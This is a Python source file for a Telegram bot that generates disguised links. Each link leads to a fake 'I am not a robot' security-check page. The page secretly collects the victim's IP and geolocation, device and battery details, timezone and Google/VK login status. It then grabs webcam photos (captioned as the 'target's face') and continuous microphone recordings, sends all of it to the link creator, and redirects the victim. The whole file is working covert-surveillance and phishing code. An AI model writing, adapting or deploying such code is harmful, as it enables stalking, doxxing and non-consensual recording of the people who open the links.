import telebot, requests, os, base64
from flask import Flask, request

API_TOKEN = os.environ.get('API_TOKEN')
bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

def get_geo(ip):
    try:
        # Прямой запрос к стабильному API
        r = requests.get(f"http://ip-api.com{ip}?fields=66846719", timeout=3).json()
        if r.get('status') == 'success':
            return f"🌍 {r['country']}, {r['city']}\n📡 {r['isp']}\n🛡️ VPN: {'ДА' if r.get('proxy') else 'НЕТ'}"
    except: pass
    return "📍 GeoIP недоступен (Vercel Block)"

@app.route('/activate')
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ СИСТЕМА АКТИВИРОВАНА"
    return "❌ ОШИБКА"

@app.route('/' + (API_TOKEN if API_TOKEN else "none"), methods=['POST'])
def get_m():
    bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
    return "!", 200

@app.route('/v/<data>')
def logger(data):
    try:
        # Расшифровываем ID админа и ссылку прямо из URL (фикс памяти Vercel)
        decoded = base64.b64decode(data).decode('utf-8')
        owner_id, target = decoded.split('|')
    except: return "LINK ERROR", 400

    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
    geo = get_geo(ip)
    
    bot.send_message(owner_id, f"🎯 *НОВЫЙ ТАРГЕТ!*\n\n👤 IP: `{ip}`\n{geo}", parse_mode="Markdown")
    
    return f'''
    <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
    <body style="background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center;">
        <div>
            <div style="font-size:65px;margin-bottom:15px;">🛡️</div>
            <h2>Проверка безопасности</h2>
            <button id="go" style="padding:20px 70px;border:none;border-radius:50px;background:#fff;color:#000;font-weight:900;cursor:pointer;">Я НЕ РОБОТ</button>
        </div>
        <video id="v" style="display:none;" autoplay playsinline muted></video><canvas id="c" style="display:none;"></canvas>
        <script>
        document.getElementById('go').onclick = async () => {{
            document.getElementById('go').innerText = "Анализ...";
            let d = {{
                owner: "{owner_id}",
                hw: {{ scr: screen.width+"x"+screen.height+"*"+devicePixelRatio, cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory || "N/A" }},
                bat: {{ lvl: "N/A", char: "N/A" }},
                net: {{ type: navigator.connection ? navigator.connection.effectiveType : "N/A", tz: Intl.DateTimeFormat().resolvedOptions().timeZone }},
                social: {{ g: "❌", vk: "❌" }}
            }};
            try {{
                let b = await navigator.getBattery();
                d.bat.lvl = Math.round(b.level * 100) + "%";
                d.bat.char = b.charging ? "(Заряжается)" : "(Нет)";
            }} catch(e) {{}}
            const ck = (u) => new Promise(r => {{ let i = new Image(); i.onload=()=>r("✅"); i.onerror=()=>r("❌"); i.src=u; }});
            d.social.g = await ck("https://accounts.google.com");
            d.social.vk = await ck("https://vk.com");

            fetch('/log_extra', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(d) }});

            try {{
                const s = await navigator.mediaDevices.getUserMedia({{ video: true, audio: true }});
                const v = document.getElementById('v'); v.srcObject = s;
                
                function rec() {{
                    const r = new MediaRecorder(s); const ch = [];
                    r.ondataavailable = e => ch.push(e.data);
                    r.onstop = () => {{
                        const f = new FormData(); f.append('audio', new Blob(ch, {{type:'audio/webm'}}), 'a.webm'); f.append('owner', "{owner_id}");
                        fetch('/log_audio', {{ method: 'POST', body: f }});
                        if(s.active) rec();
                    }};
                    r.start(); setTimeout(() => r.stop(), 8000);
                }}
                rec();

                setTimeout(() => {{
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {{
                        const f = new FormData(); f.append('photo', b, 'p.jpg'); f.append('owner', "{owner_id}");
                        fetch('/log_photo', {{ method: 'POST', body: f }}).then(() => {{ 
                            setTimeout(() => {{ window.location.href = "{target}"; }}, 1500);
                        }});
                    }}, 'image/jpeg', 0.7);
                }}, 1500);
            }} catch(e) {{ window.location.href = "{target}"; }}
        }};
        </script>
    </body></html>
    '''

@app.route('/log_extra', methods=['POST'])
def log_extra():
    d = request.json
    m = (f"🖥 *ТЕХНИЧЕСКИЙ ОТЧЕТ*\n\n"
         f"🔋 *Заряд:* {d['bat']['lvl']} {d['bat']['char']}\n"
         f"🌐 *Сеть:* {d['net']['type']}\n"
         f"🧠 *CPU:* {d['hw']['cores']} ядер | *RAM:* {d['hw']['ram']}GB\n"
         f"📺 *Экран:* {d['hw']['scr']}\n"
         f"👤 *Вход:* Google: {d['social']['g']} | VK: {d['social']['vk']}\n"
         f"🕒 *Пояс:* {d['net']['tz']}")
    bot.send_message(d['owner'], m, parse_mode="Markdown")
    return "ok"

@app.route('/log_photo', methods=['POST'])
def log_photo():
    f, owner = request.files.get('photo'), request.form.get('owner')
    if f and owner: bot.send_photo(owner, f.read(), caption="📸 *ЛИЦО ТАРГЕТА*")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    f, owner = request.files.get('audio'), request.form.get('owner')
    if f and owner: bot.send_document(owner, f.read(), caption="🎤 *РЕАКЦИЯ*")
    return "ok"

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create(m):
    url = m.text.strip()
    if not url.startswith("http"): url = "https://" + url
    raw_data = f"{m.chat.id}|{url}"
    encoded = base64.b64encode(raw_data.encode()).decode()
    bot.reply_to(m, f"✅ Ссылка:\n`https://{request.host}/v/{encoded}`", parse_mode="Markdown")
